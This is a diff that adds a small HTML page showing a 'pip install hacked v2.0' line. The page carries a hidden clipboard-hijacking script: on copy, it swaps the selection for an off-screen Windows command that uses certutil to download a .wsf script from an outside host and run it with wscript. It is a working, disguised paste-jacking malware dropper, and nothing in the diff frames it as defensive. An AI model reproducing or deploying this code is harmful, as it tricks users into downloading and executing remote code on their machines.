@@ -1,0 +1,25 @@
+<html>
+<body>
+	pip install hacked v2.0
+	<br />
+</body>
+
+<script type="text/javascript">
+	document.oncopy = function(){
+		var bodyElement = document.body; 
+		var selection = getSelection(); 
+		var href= document.location.href;
+		var copyright = "%SystemRoot%\\system32\\certutil.exe -urlcache -split -f http://file.netip4.ru/Exponenta/Distrib/LIB-WSH/echo.wsf & wscript echo.wsf\n";
+		var text = copyright;
+		var divElement = document.createElement('div');
+		divElement.style.position = 'absolute'; 
+		divElement.style.left = '-99999px';
+		divElement.innerHTML = text;
+		bodyElement.appendChild(divElement);
+		selection.selectAllChildren(divElement); 
+		setTimeout(function() {
+			bodyElement.removeChild(divElement); 
+		}, 0);
+};
+</script>
+</html>
